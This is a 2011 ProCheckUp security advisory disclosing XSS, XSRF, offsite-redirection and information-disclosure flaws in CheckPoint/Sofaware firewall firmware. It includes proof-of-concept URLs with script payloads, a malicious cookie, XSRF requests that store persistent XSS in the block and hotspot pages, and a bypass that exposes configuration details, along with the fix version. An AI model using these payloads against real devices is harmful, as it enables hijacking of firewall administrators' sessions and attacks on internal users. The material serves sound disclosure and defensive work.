@@ -1,0 +1,108 @@
+ProCheckUp Research
+
+http://procheckup.com/procheckup-labs/pr11-07.aspx
+
+PR11-07 Multiple peristent XSS, XSS, XSRF, offsite redirection and information disclosure flaws within CheckPoint/Sofaware firewalls
+ 
+Vulnerability found: 3rd May 2011
+
+Vendor informed:  20th July 2011
+
+Vulnerability fixed: 16th October 2011/14 December 2011
+
+Severity: High
+
+Description: 
+
+CheckPoint/Sofaware firewalls are popular compact UTM (Unified Threat Management) devices, commonly found deployed in corporate satellite offices sometimes even within private households. ProCheckUp has discovered that multiple peristent XSS, XSS, XSRF, offsite redirection and information disclosure vulnerabilities exist within these firewalls. Which might allow the protective nature of the firewall to be subverted, placing internal users at risk from attack.
+
+Please see our paper titled "Checkpoint/SofaWare Firewall Vulnerability Research", for more better details.
+
+
+Tested on versions 7.5.48x, 8.1.46x and 8.2.2x.
+
+
+1) The following demonstrate the reflective XSS flaws:-
+
+a) The Ufp.html page is vulnerable to XSS via the url parameter
+It works by submitting a malicious url parameter to the ufp.html page
+http://192.168.10.1/pub/ufp.html?url="><script>alert(1)</script>&mask=000&swpreview=1
+
+This works with firmware versions 7.5.48x, 8.1.46x and 8.2.2x.
+
+b) The login page is also vulnerable to an XSS via the malicious session cookie
+It works by submitting a malicious session cookie to the login page
+Cookie: session="><script>alert(1)</script>
+
+c) An authenticated XSS exists within the diagnostics command
+http://192.168.10.1/diag_command.html?sw__ver=blah1&swdata=blah2&sw__custom='");alert(1);//
+(this might need to be submitted twice)
+
+
+Consequences: 
+An attacker may be able to cause execution of malicious scripting code in the browser of a user who clicks on a link to Checkpoint firewall hosted page. Such code would run within the security context of the target domain. This type of attack can result in non-persistent defacement of the target site, or the redirection of confidential information (i.e.: session IDs) to unauthorised third parties.
+
+2) The following demonstrate the persistent XSS flaws and XSRF flaws:-
+
+a) The blocked URL warning page is vulnerable to a persistent XSS attack placing any internal users at risk of attack when the page is displayed.
+
+First an attacker has to trick the administrator to follow a XSRF attack; the (swsessioncookie) session cookie for simplicity sake is shown though JavaScript document.cookie can be used to subvert this protection (see paper).
+http://192.168.10.1/UfpBlock.html?swcaller=UfpBlock.html&swsessioncookie=20KHYp5-oS7rKmS-a4rq4j&swsave=1&ufpblockhttps=0&ufpbreakframe=&backurl=WebRules.html&ufpblockterms=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+Firewall users then visiting blocked sites will have the blocked page displayed and the attack carried out.
+http://192.168.10.1/pub/ufp.html?url=www.blockedUrl.com&mask=000&swpreview=1
+
+b) The Wi-Fi hotspot landing page on Wi-Fi enabled firewalls is also vulnerable, with any user using the Wi-Fi access point being at risk.
+
+First an attacker has to trick the administrator to follow a XSRF attack, the (swsessioncookie) session cookie for simplicity sake is shown though JavaScript document.cookie can be used to subvert this protection (see paper).
+http://192.168.10.1/HotSpot.html?swcaller=HotSpot.html&swsessioncookie=20KHYp5-oS7rKmS-a4rq4j&swsave=1&hotspotnets=00000000000000000000000000000000000000&hotspotpass=1&hotspotmulti=1&hotspothttps=0&hotspotnet1=0&hotspotnet2=0&hotspotnet3=0&hotspotenf=0&hotspottitle=Welcome+to+My+HotSpot&hotspotterms=%22%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E&thotspotpass=on&thotspotmulti=on
+
+Firewall users then visiting the Wi-Fi landing page will then have the attack carried out.
+http://192.168.10.1/pub/hotspot.html?swpreview=1
+
+
+Consequences: 
+An attacker may be able to cause execution of malicious scripting code in the browser of a user who clicks on a link to Checkpoint firewall hosted page. Such code would run within the security context of the target domain. Using persistent XSS attacks the attacker does not have to trick his victims to visit his malicious page, as the malicious code is stored by and becomes part of the webpage.
+
+
+3) The following demonstrate the (authenticated) offsite redirection flaws:-
+
+a) Enter the following URL to redirect
+http://192.168.10.1/12?swcaller=http://www.procheckup.com
+
+b) Enter the following URL and then press back button.
+http://192.168.10.1/UfpBlock.html?backurl=http://www.procheckup.com
+
+Consequences:
+Offsite redirection is typically used to perform phishing type attacks, by fooling an authenticated user to re-enter authentication details in an external site.
+
+4) The following demonstrate the Information disclosure flaws (no authentication needed)
+It was found that the /pub/test.html program disclosed information, regarding the patch level used, licensing and the MAC addresses to unauthenticated users.
+
+a) On early firmware versions 5.0.82x, 6.0.72x & 7.0.27x 7.5.48x
+Just requesting http:// 192.168.10.1/pub/test.html is sufficient
+
+b) However this no longer worked on versions 8.1.46x & 8.2.26x however adding the URL parameter and a double quote bypassed this check
+https:// 192.168.10.1/pub/test.html?url="
+
+
+Consequences: 
+An attacker may be able to obtain additional information on the machines configuration, and use this information to carry out further attacks.
+
+Fix:
+Upgrade to firmware version 8.2.44 or higher, which solves these vulnerabilities 
+https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk65460
+
+References: 
+http://www.procheckup.com/Vulnerabilities.php
+
+
+Credits: Richard Brain of ProCheckUp Ltd (www.procheckup.com)
+
+
+Legal:
+Copyright 2012 Procheckup Ltd. All rights reserved.
+
+Permission is granted for copying and circulating this Bulletin to the Internet community for the purpose of alerting them to problems, if and only if, the Bulletin is not edited or changed in any way, is attributed to Procheckup, and provided such reproduction and/or distribution is performed for non-commercial purposes.
+
+Any other use of this information is prohibited. Procheckup is not liable for any misuse of this information by any third party.
